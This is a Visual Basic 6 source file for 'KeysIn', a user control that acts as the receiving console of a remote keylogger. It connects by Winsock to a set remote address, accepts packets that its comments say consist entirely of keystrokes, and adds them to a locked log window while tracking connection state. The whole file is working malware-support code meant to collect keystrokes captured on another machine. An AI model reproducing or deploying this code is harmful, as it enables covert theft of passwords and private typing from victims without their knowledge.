VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.UserControl KeysIn 
   ClientHeight    =   5235
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7170
   PropertyPages   =   "KeysIn.ctx":0000
   ScaleHeight     =   5235
   ScaleWidth      =   7170
   ToolboxBitmap   =   "KeysIn.ctx":0011
   Begin VB.TextBox txtKeylog 
      Height          =   4635
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Top             =   0
      Width           =   5115
   End
   Begin VB.TextBox txtLog 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   0
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   4680
      Width           =   5115
   End
   Begin VB.Timer timState 
      Interval        =   500
      Left            =   5250
      Top             =   1980
   End
   Begin MSWinsockLib.Winsock Socket 
      Left            =   5250
      Top             =   2400
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ImageList imgConnect 
      Left            =   5220
      Top             =   1410
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   14
      ImageHeight     =   14
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   2
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "KeysIn.ctx":0323
            Key             =   "OFF"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "KeysIn.ctx":06DB
            Key             =   "ON"
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.StatusBar StatusBar 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   2
      Top             =   4980
      Width           =   7170
      _ExtentX        =   12647
      _ExtentY        =   450
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   4
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   413
            MinWidth        =   413
            Key             =   "icon"
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   2646
            MinWidth        =   2646
            Text            =   "0.0.0.0"
            TextSave        =   "0.0.0.0"
            Key             =   "ip"
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   1196
            MinWidth        =   1196
            Text            =   "0"
            TextSave        =   "0"
            Key             =   "port"
         EndProperty
         BeginProperty Panel4 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            AutoSize        =   1
            Object.Width           =   8255
            Key             =   "state"
         EndProperty
      EndProperty
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
End
Attribute VB_Name = "KeysIn"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_Ext_KEY = "PropPageWizardRun" ,"Yes"
Option Explicit
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Public Event SocketError(ErrorDescription As String)
Public Event KeyLogged(strKeys As String)
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Private mvarRemoteIP As Variant
Private mvarRemotePort As Variant
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||


'===============================
'   Timer
'===============================
Private Sub timState_Timer()
Static Wait As Integer
Static LastState As Integer

    ' Depending on our socket state, we set
    ' visual effects.
    If Socket.State <> LastState Then
        If Socket.State <> 7 Then
            OfflineSub
        Else
            OnlineSub
        End If
    End If
    LastState = Socket.State
    
    ' Used this line to reconnect:
    ' If Socket.State = 9 Or Socket.State = 8 Then ConnectSub
    If Socket.State = 9 Or Socket.State = 8 Then Log ("Connection Lost.")

End Sub


'===============================
'   UserControl Initialize
'===============================
Private Sub UserControl_Initialize()
    ' Set Visuals
    OfflineSub
End Sub


'===============================
'   User Resize Event
'===============================
Private Sub UserControl_Resize()
    UserControl.Width = 5135
    UserControl.Height = 5260
End Sub


'===============================
'   .WinsockState
'===============================
Public Function WinsockState()
    ' Return Socket State
    WinsockState = Socket.State
End Function


'===============================
'   .Disconnect
'===============================
Public Function Disconnect()
    Socket.Close
End Function


'===============================
'   .Connect
'===============================
Public Sub Connect()

    Socket.Close
    Socket.Connect RemoteIP, RemotePort
    Log ("Connecting...")

End Sub


'===============================
'   OnlineSub (Visual)
'===============================
Sub OnlineSub()

    StatusBar.Panels(1).Picture = imgConnect.ListImages(2).Picture
    StatusBar.Panels(2).Text = Socket.RemoteHost
    StatusBar.Panels(3).Text = Socket.RemotePort
    StatusBar.Panels(4).Text = SocketState(Socket.State)
    Log SocketState(Socket.State)

End Sub


'===============================
'   OfflineSub (Visual)
'===============================
Sub OfflineSub()
    
    StatusBar.Panels(1).Picture = imgConnect.ListImages(1).Picture
    StatusBar.Panels(2).Text = "0.0.0.0"
    StatusBar.Panels(3).Text = "0"
    StatusBar.Panels(4).Text = "Offline"
    Log SocketState(Socket.State)

End Sub


'===============================
'   ConnectSub
'===============================
Private Sub ConnectSub()

    'Used to Reconnect
    Socket.Close
    Socket.Connect
    Log SocketState(Socket.State)

End Sub


'===============================
'   Error Sub
'===============================
Private Sub Socket_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Log Description
    RaiseEvent SocketError("Error " & Number & " (" & Description & ")")
End Sub


'===============================
'   Data Arrival (Winsock)
'===============================
Private Sub Socket_DataArrival(ByVal bytesTotal As Long)
Dim iPacket As String
Dim iCom As String
Static Live As Boolean
On Error GoTo ErrSub

    ' -------------------------------
    ' Packet Structure: None.
    ' All packets consist of keystrokes.
    ' No need to architect a structure
    ' when you only send keystrokes, ie one item.
    ' -------------------------------
    ' [COM - 3 CHAR][KEYDATA - INF CHAR]
    ' -------------------------------
    ' Parse Packet
    Socket.GetData iPacket               '- Pull Data from Socket
    iCom = Word(iPacket, 1, SP1)         '- Parse [COM]
    
    ' Pull Keys, then write to Log
    iPacket = Right(iPacket, Len(iPacket) - Len(iCom) - 1)
    txtKeylog.Text = txtKeylog.Text & iPacket

Exit Sub
ErrSub:
Select Case Err.Number
    Case Else
            RaiseEvent SocketError("Error " & Err.Number & " (" & Err.Description & ")")
End Select
End Sub


'===============================
'   Log
'===============================
Private Sub Log(logData As String)
    txtLog = logData & vbCrLf & txtLog                      '- Add Text Too Log
    If Len(txtLog) <> 500 Then txtLog = Left(txtLog, 500)   '- Not too long...
End Sub


'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
'   CLASS OBJECT PROPERTY
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Public Property Let RemotePort(ByVal vData As Variant)
'Syntax: X.RemotePort = 5
    mvarRemotePort = vData
End Property
Public Property Set RemotePort(ByVal vData As Variant)
'Syntax: Set x.RemotePort = Form1
    Set mvarRemotePort = vData
End Property
Public Property Get RemotePort() As Variant
Attribute RemotePort.VB_ProcData.VB_Invoke_Property = "SocketPage"
'Syntax: Debug.Print X.RemotePort
    If IsObject(mvarRemotePort) Then
        Set RemotePort = mvarRemotePort
    Else
        RemotePort = mvarRemotePort
    End If
End Property
Public Property Let RemoteIP(ByVal vData As Variant)
'Syntax: X.RemoteIP = 5
    mvarRemoteIP = vData
End Property
Public Property Set RemoteIP(ByVal vData As Variant)
'Syntax: Set x.RemoteIP = Form1
    Set mvarRemoteIP = vData
End Property
Public Property Get RemoteIP() As Variant
Attribute RemoteIP.VB_ProcData.VB_Invoke_Property = "SocketPage"
'Syntax: Debug.Print X.RemoteIP
    If IsObject(mvarRemoteIP) Then
        Set RemoteIP = mvarRemoteIP
    Else
        RemoteIP = mvarRemoteIP
    End If
End Property
